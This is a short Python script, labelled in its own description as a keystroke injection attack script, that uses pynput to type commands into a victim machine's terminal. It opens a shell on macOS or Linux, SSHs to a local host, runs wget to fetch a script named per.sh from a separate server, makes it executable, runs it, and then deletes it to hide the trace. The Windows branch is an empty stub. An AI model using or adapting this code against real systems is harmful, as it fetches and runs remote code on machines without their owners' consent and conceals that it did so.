from time import sleep
from pynput.keyboard import Key, Controller
import argparse
import os

SUP_OS = ['MacOS','Linux','Win10']

parser = argparse.ArgumentParser(description='Key Stroke Injection attack script')
parser.add_argument('--os', type=str, default='MacOS', 
					help='Victim OS', choices=SUP_OS)

args = parser.parse_args()

def mac_shell(kb):
	kb.press(Key.cmd_r)
	kb.press(' ')
	kb.release(' ')
	kb.release(Key.cmd_r)
	sleep(.2)
	kb.type('terminal')
	sleep(.2)
	enter(keyboard)

def linux_shell(kb):
	kb.press(Key.ctrl_l)
	kb.press(Key.alt_l)
	kb.press('t')
	kb.release(Key.ctrl_l)
	kb.release(Key.alt_l)
	kb.release('t')

def win_cmd(kb):
	# here pynput code for activating win cmd
	pass

def enter(kb):
	kb.press(Key.enter)
	kb.release(Key.enter)
	
def type_cmd(kb, command):
	sleep(.1)
	kb.type(command)
	sleep(.2)
	enter(kb)

keyboard = Controller()
sleep(3)

# SSH in
type_cmd(keyboard, 'ssh sane@192.168.10.20')
sleep(.4)

# Load script
type_cmd(keyboard, 'wget http://192.168.10.89:8000/victim/per.sh')
sleep(1)

# Execute script
type_cmd(keyboard, 'chmod +x ./per.sh')
sleep(.2)
type_cmd(keyboard, './per.sh')
sleep(.2)

# Remove
type_cmd(keyboard, 'rm ./per.sh')

# Exit
type_cmd(keyboard, 'exit')

